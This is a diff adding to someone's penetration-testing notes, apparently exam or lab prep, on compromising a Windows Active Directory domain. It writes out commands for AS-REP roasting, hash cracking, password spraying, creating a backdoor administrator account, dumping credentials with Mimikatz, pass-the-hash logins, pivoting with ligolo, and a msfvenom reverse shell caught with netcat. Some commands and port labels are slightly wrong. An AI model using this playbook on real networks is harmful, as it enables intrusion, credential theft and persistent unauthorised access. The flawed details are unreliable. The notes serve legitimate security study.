@@ -104,6 +104,160 @@ Once we have a first access on a machine, we can run winpeas or enumerate manual
                 If we have connectivity to the DC:
                     impacket-GetUserSPNs -request -dc-ip <DC IP> <domain.name>/<user>
                     Enter the Password found before
-                If we get the message "No entries found!" == No Kerberosting possible :( ...
-                    
+                If we get the message "No entries found!" == No Kerberosting possible - No svc-account available:( ...
+
+        We will test Webroasting
+
+    Webroasting-ASREP:
+                We will ask for the list of all USERS that dont require PRE AUTH
+                    impacket-GetNPUsers <domain.name>/<user>:
+                        display available Newusername
+                    impacket-GetNPUsers <domain.name>/<user> -outputfile Newusername.asrep
+                If ok we will get the ASREP HASH of Newusername 
+
+                We cannot use ASREP for PASS the Hash
+                    So we will try to DeHash - If we good we'll have the celar password:
+                        hashcat Newusername.asrep /usr/share/wordlists/rockyou.txt
+
+        In the mean time we will Enum the DC and machines via Nmap
+
+    DC Enum:
+            We will enum all the ports in aggressive way becaus enot real scenario:
+                nmap -PN -T4 -p- -v <DC or Machine IP> -oN enu/nmap_ports.log 
+            We can also enum the top 50 ports:
+                nmap -PN -sV --top-portd 50 --open <DC or Machine IP>
+
+        If we find RPC Port 3389:
+            try the credentials of (Newusername + hashcat clear password) founded by connecting to the firt machine that we have access in RPC and perform runas cmd:
+                runas /user:domain\Newusername cmd.exe
+
+                We will query the domain to find the users:
+                    net user /domain
+
+                From this we will get all the existant domain users to prepare Password Spray attack on port 3389:
+                    -We copy all users founded + "administartor" in txt file in our Kali
+                    -We will create a Password txt file and paste it the passwords that we found previously
+
+                -Crackmapexec against the DC if we found (port that could lead to think about it is a DC: 53,88,445,139)
+                    enumerate SMB 445: 
+                        crackmapexec smb -u <user.txt> -p <passwords.txt> --continue-on-success <DC IP>
+                        crackmapexec: cme smb <ip> -u " -p" <----Enumerate Null Sessions
+                        crackmapexec: cme smb <ip> -u'a' -p" <----Enumerate Anonymous Access
+
+                        We can test RDP 3389:
+                            crackmapexec rdp -u <user.txt> -p <passwords.txt> --continue-on-success <Machine IP>
+                            If PWND:
+                                xfreerdp /v:<Vitcime Machine IP> /u:<username> /d:<domain.name> /p:<password> +clipboard / cert:ignore\
+                                If we onle have the Username we can use xfreerdp to perform PTH attack also.
+                            If we get access:
+                                cmd:
+                                    net user 
+                                    net localgroup administartors
+
+                                    Check local admin privilige, if we found one that we already have creds:
+                                        runas /user:domain\user cmd.exe 
+                                        if good:
+                                            whoami /priv 
+                                            whoami /all 
+                                open an admin cmd:
+                                    net user/add backdoor Password1 <---We create a Backdoor
+                                    net localgroup administrators /add backdoor 
+                                    net localgroup administartors
+
+                                    import Mimikatz (2 Technics import from the first corrupted machine who's already download mimikatz from Kali or use PortForwarding from this new machine back to our Kali machine):
+                                        1st Technic SMB Share: open RDP on the 1st Corrupted Machine, place Mimikatz on "Public" folder:
+                                           Admin cmd:
+                                            net share public=c:\Users\Public /GRANT:Everyone,Full
+                                            net share
+                                            We will make it consultable for everyone via GUI:
+                                                This PC -> Public -> Properties -> Security -> Edit -> Add -> Location -> Cancel -> Choose the Second Corrupted Machine Name -> Enter the object name: everyone -> Check Name
+
+                                            We go back to the second Corrupted Machine in GUI and check if mimikatz is accessible:
+                                                Network -> Machine -> Public:
+                                                    if OK:
+                                                        mimikatz:
+                                                            privilege::debug (20 ok)
+                                                            log
+                                                            lsadump::lsa /inject
+                                                            sekurlsa::logonpasswords
+
+                                                            check the log in the Public Folder + ctrl F (try to fin Golden ticket - Administrator - NTLM Hash)
+                                                                if OK:
+                                                                    in Kali:
+                                                                        echo NTLMhash > adminHash.hash
+                                                                        hashcat adminHash.hash /usr/share/wordlists/rockyou.txt m-1000
+
+                                                                        if not deHashed we can use:
+                                                                            hashcat adminHash.hash /usr/share/wordlists/rockyou.txt m-1000 -r /usr/share/hashcat/rule/best64.rule
+
+                                                                        if still not:
+                                                                            PTH Attack:
+                                                                                evil-winrm -i <DC IP> -u administrator -H NTLMHash
+
+                                                                                IF ok - Screenshoot:
+                                                                                    cd C:\Users\Administrator\Documents
+                                                                                    dir desktop
+                                                                                    users\proof.txt
+                                        
+                                        2nd Technic PortForwarding:
+                                            Proxy Listenner: Open a port on 1st corrupted machine + allow connection to our Kali.
+                                                If ok we will make a connection directly from our Kali to the 2nd Corrupted Machine:
+                                                    in Kali:
+                                                        ligolo
+                                                            listenner_add -addr 0.0.0.0:8888 --to 127.0.0.1:80
+                                                            listenner_list
+
+                                                            cd/Where Mimikatz is Located:
+                                                                python -m http.server - . 80
+                                                    
+                                                    in DC Machine or 2nd corrupted Mahcine if we don<t have initially access to DC:
+                                                        certutil.exe -f -urlcache http://<1stCorruptedMachineName>:8888/winrev443.exe winrev443.exe
+                                                        certutil.exe -f -urlcache http://<1stCorruptedMachineName>:8888/mimikatz.exe mimikatz.exe  
+
+                                            OR
+
+                                            Reverse Shell:
+                                                in Kali:
+                                                        ligolo
+                                                            listenner_add -addr 0.0.0.0:4444 --to 127.0.0.1:443
+                                                            listenner_list
+
+                                                        msfvenom:
+                                                            msfvenom -p windows/x64/shell_reverse_tcp  LHOST=<1st Corrupted Machihne IP> LPORT=4444 -f exe -o winrev4444ms01.exe
+                                                        
+                                                        evil-winrm:
+                                                            evil-winrm -i <DC IP> -u administrator -H NTLMHash
+                                                            upload winrev4444ms01.exe
+
+                                                        kali:
+                                                        nc -lvnp 443
+
+                                                        evil-winrm:
+                                                            .\winrev4444ms01.exe 
+                                                            whoami
+                                                            hostname
+
+                            If we found some "ephemeral" ports we can assume that we can use "Win RM":
+                            crackmapexec winrm <DC IP> <--Fingerprinting
+                            crackmapexec winrm -u <user.txt> -p <passwords.txt> --continue-on-success <DC IP>
+
+                        OR
+
+                        enum4linux -A <DC IP>
+                        enum4linux -A <DC IP> -u <username> -p <password>
+                        if no creds:
+                            enum4linux -a -u "" -p "" <DC IP>
+                            enum4linux -a -u "guest" -p "" <DC IP>
+                        
+                        OR 
+
+                        smbclient (refer to: /Phase_2/Eumeration/Enumerate_SMB.txt)
+                        smbclient -L \\<DC IP> -U <domain/username> 
+                        if no creds:
+                            smbclient -U '%' -L//<DC IP>
+                            smbclient -U 'guest%' -L//<DC IP>
+                
+
+        
+
 
